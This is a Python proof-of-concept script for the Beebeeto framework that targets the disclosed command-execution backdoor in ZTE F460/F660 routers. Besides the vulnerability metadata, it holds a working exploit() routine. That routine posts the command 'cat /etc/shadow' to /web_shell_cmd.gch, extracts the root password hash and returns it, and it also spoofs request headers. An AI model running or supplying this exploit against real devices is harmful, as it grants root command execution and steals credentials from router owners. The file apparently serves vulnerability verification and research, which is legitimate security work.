#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame
from utils.http.forgeheaders import ForgeHeaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0025',
            'name': 'ZTE f460/f660 /web_shell_cmd.gch 命令执行后门 POC',
            'author': 'foundu',
            'create_date': '2015-02-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ZTE',
            'vul_version': ['*'],
            'type': 'Command Execution',
            'tag': ['中兴F460/F660后门漏洞', '/web_shell_cmd.gch', 'gch'],
            'desc': '''
                    2014 年 3 月 3 日，Rapid7 团队发布了中兴 F460 / F660
                    后门信息[1]，任何可以访问设备的用户都可以直接访问一个命令执行的 Web 界面，并以 root 权限执行任意命令。
                    ''',
            'references': [
                   ("https://community.rapid7.com/community/infosec/blog/2014/03/03/disclosure-r7-2013-18-zte-f460"
                    "-and-zte-f660-webshellcmdgch-backdoor"),
                   ("http://blog.knownsec.com/2015/01/zte-soho-routerweb_shell_cmd-gch-%E8%BF%9C%E7%A8%8B%E5%91"
                    "%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%BA%94%E6%80%A5%E6%A6%82%E8%A6%81/"),
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        fake_headers = ForgeHeaders().get_headers()
        if args['options']['target'][-1:] == '/':
            verify_url = '%sweb_shell_cmd.gch' % args['options']['target']
        else:
            verify_url = '%s/web_shell_cmd.gch' % args['options']['target']
        req = requests.get(verify_url, headers=fake_headers)
        key = "<FORM NAME=fSubmit ID=fSubmit METHOD='POST' action='/web_shell_cmd.gch'>"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if req.status_code == 200 and key in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        fake_headers = ForgeHeaders().get_headers()
        if args['options']['target'][-1:] == '/':
            verify_url = '%sweb_shell_cmd.gch' % args['options']['target']
        else:
            verify_url = '%s/web_shell_cmd.gch' % args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url, headers=fake_headers)
        key = "<FORM NAME=fSubmit ID=fSubmit METHOD='POST' action='/web_shell_cmd.gch'>"
        payload = {'IF_ACTION': 'apply',
                   'IF_ERRORSTR': 'SUCC',
                   'IF_ERRORPARAM': 'SUCC',
                   'IF_ERRORTYPE': '-1',
                   'Cmd': 'cat /etc/shadow',
                   'CmdAck': '',}
        if req.status_code == 200 and key in req.content:
            try:
                shadow = requests.get(verify_url, data=payload, headers=fake_headers).content
            except:
                shadow = 'Shadow read fail.'
            root = re.compile(r'class="textarea_1">(\S+)').findall(shadow)[0]
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['etc_shadow']= root
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())